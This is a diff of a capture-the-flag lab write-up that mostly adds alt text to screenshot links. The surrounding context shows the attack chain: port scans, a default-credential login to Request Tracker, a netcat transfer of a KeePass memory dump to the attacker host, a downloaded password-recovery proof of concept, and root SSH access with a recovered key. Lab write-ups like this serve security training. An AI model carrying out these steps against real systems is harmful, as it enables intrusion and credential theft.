@@ -38,7 +38,7 @@ First, we verify that the host is reachable:
 ping -c 1 10.10.11.227
 ```
 
-![](screenshots/ping.png)
+![ping](screenshots/ping.png)
 
 ---
 ### 1.2 Port Scanning
@@ -49,7 +49,7 @@ We scan all TCP ports with Nmap to identify services:
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.227 -oG allPorts
 ```
 
-![](screenshots/allports.png)
+![allports](screenshots/allports.png)
 
 Extract open ports:
 
@@ -57,7 +57,7 @@ Extract open ports:
 extractPorts allPorts
 ```
 
-![](screenshots/extractports.png)
+![extractports](screenshots/extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -68,16 +68,16 @@ We run a detailed scan on discovered ports:
 nmap -sCV -p22,80 10.10.11.227 -oN targeted
 ```
 
-![](screenshots/targeted.png)
+![targeted](screenshots/targeted.png)
 
 **Findings:**  
 - **SSH** → OpenSSH 8.9p1 Ubuntu 3ubuntu0.3  
 
-![](screenshots/launchpad_openssh.png)
+![launchpad_openssh](screenshots/launchpad_openssh.png)
 
 - **HTTP** → nginx 1.18.0
 
-![](screenshots/launchpad_nginx.png)
+![launchpad_nginx](screenshots/launchpad_nginx.png)
 
 Note: The `Uploaded To` field in banners hints that one service could be containerized (possibly Docker), but this detail does not directly affect exploitation.
 
@@ -88,11 +88,11 @@ Note: The `Uploaded To` field in banners hints that one service could be contain
 
 Visiting the IP shows a placeholder page:  
 
-![](screenshots/web.png)
+![web](screenshots/web.png)
 
 Clicking the message displays an error implying the hostname must be in `/etc/hosts`:  
 
-![](screenshots/web_not_in_etc_hosts.png)
+![web_not_in_etc_hosts](screenshots/web_not_in_etc_hosts.png)
 
 We add:
 
@@ -102,14 +102,14 @@ We add:
 
 Now, the site loads a login page:  
 
-![](screenshots/web_in_etc_hosts.png)
+![web_in_etc_hosts](screenshots/web_in_etc_hosts.png)
 
 ---
 ### 2.2 Identifying Request Tracker
 
 We see “Request Tracker” branding:  
 
-![](screenshots/request_tracker.png)
+![request_tracker](screenshots/request_tracker.png)
 
 Searching for it on Google reveals the GitHub repository:  
 [https://github.com/bestpractical/rt](https://github.com/bestpractical/rt)
@@ -131,7 +131,7 @@ Username: root
 Password: password
 ```
 
-![](screenshots/web_login.png)
+![web_login](screenshots/web_login.png)
 
 Access granted.
 
@@ -140,9 +140,9 @@ Access granted.
 
 Inside `Admin → Users`, we locate another user:  
 
-![](screenshots/web_admin_users_section.png)
+![web_admin_users_section](screenshots/web_admin_users_section.png)
 
-![](screenshots/web_lnorgaard.png)
+![web_lnorgaard](screenshots/web_lnorgaard.png)
 
 Credentials found:
 
@@ -162,7 +162,7 @@ We connect via SSH:
 ssh lnorgaard@10.10.11.227
 ```
 
-![](screenshots/ssh_lnorgaard.png)
+![ssh_lnorgaard](screenshots/ssh_lnorgaard.png)
 
 🏁 **User flag obtained**.
 
@@ -179,7 +179,7 @@ lsb_release -a
 ls -l
 ```
 
-![](screenshots/ssh_lnorgaard_info.png)
+![ssh_lnorgaard_info](screenshots/ssh_lnorgaard_info.png)
 
 This is an Ubuntu Jammy system.
 
@@ -198,7 +198,7 @@ nc -nlvp 443 > file.zip
 nc 10.10.14.7 443 < RT30000.zip
 ```
 
-![](screenshots/download_zip_file.png)
+![download_zip_file](screenshots/download_zip_file.png)
 
 Verify integrity:
 
@@ -206,26 +206,26 @@ Verify integrity:
 md5sum file.zip
 ```
 
-![](screenshots/zip_file_hash.png)
+![zip_file_hash](screenshots/zip_file_hash.png)
 
 ---
 ### 4.3 KeePass Database Analysis
 
 Unzipping reveals `passcodes.kdbx`:  
 
-![](screenshots/read_files_in_zip_file.png)
-![](screenshots/unzip_zip_file.png)
+![read_files_in_zip_file](screenshots/read_files_in_zip_file.png)
+![unzip_zip_file](screenshots/unzip_zip_file.png)
 
 Opening with KeePassXC requires a master password:  
 ```bash
 keepassxc passcodes.kdbx
 ```
 
-![](screenshots/keepass_app.png)
+![keepass_app](screenshots/keepass_app.png)
 
 We dump its hash:  
 
-![](screenshots/keepass2john_kdbx.png)
+![keepass2john_kdbx](screenshots/keepass2john_kdbx.png)
 
 The hash is not crackable with standard wordlists.
 
@@ -242,11 +242,11 @@ wget https://raw.githubusercontent.com/matro7sh/keepass-dump-masterkey/refs/head
 python3 poc.py KeePassDumpFull.dmp
 ```
 
-![](screenshots/wget_poc_py.png)
+![wget_poc_py](screenshots/wget_poc_py.png)
 
 Output contains special characters. Searching reveals it’s Danish: `Rødgrød med Fløde`.
 
-![](screenshots/password_search.png)
+![password_search](screenshots/password_search.png)
 
 ---
 ### 4.5 Unlocking KeePass
@@ -258,7 +258,7 @@ rødgrød med fløde
 
 Inside KeePass, we find two entries. The `root` entry contains a **PuTTY-User-Key-File**:  
 
-![](screenshots/keepass_password_saved.png)
+![keepass_password_saved](screenshots/keepass_password_saved.png)
 
 ---
 ## 5. Privilege Escalation
@@ -268,10 +268,10 @@ Inside KeePass, we find two entries. The `root` entry contains a **PuTTY-User-Ke
 First, we verify that common direct escalation paths are **not** viable:
 
 - SSH login as `root` using a password → rejected.  
-    ![](screenshots/ssh_root.png)
+    ![ssh_root](screenshots/ssh_root.png)
 
 - From the compromised user, trying to elevate locally (e.g., `sudo`/`su`) also fails.  
-    ![](screenshots/lnorgaard_ssh.png)
+    ![lnorgaard_ssh](screenshots/lnorgaard_ssh.png)
 
 This confirms we must leverage the material found in KeePass.
 
@@ -281,13 +281,13 @@ This confirms we must leverage the material found in KeePass.
 
 The `root` entry in KeePass includes a **PuTTY-User-Key-File**. We save its contents as `private_key` and convert it to an OpenSSH private key with `puttygen`:
 
-``` bash
+```bash
 puttygen private_key -O private-openssh -o id_rsa 
 ```
 
-![](screenshots/private_key.png)
+![private_key](screenshots/private_key.png)
 
-![](screenshots/id_rsa.png)
+![id_rsa](screenshots/id_rsa.png)
 
 ---
 
@@ -295,14 +295,15 @@ puttygen private_key -O private-openssh -o id_rsa
 
 With the OpenSSH key ready and permissions set, we authenticate as `root` **without a password**:
 
-``` bash
+```bash
 chmod 600 id_rsa
 ssh -i id_rsa root@10.10.11.227
 ```
 
-![](screenshots/root_flag.png)
+![root_flag](screenshots/root_flag.png)
 
-🏁 **Root flag obtained**.
+🏁 **Root flag obtained**
+
 ---
 # ✅ MACHINE COMPLETE
 
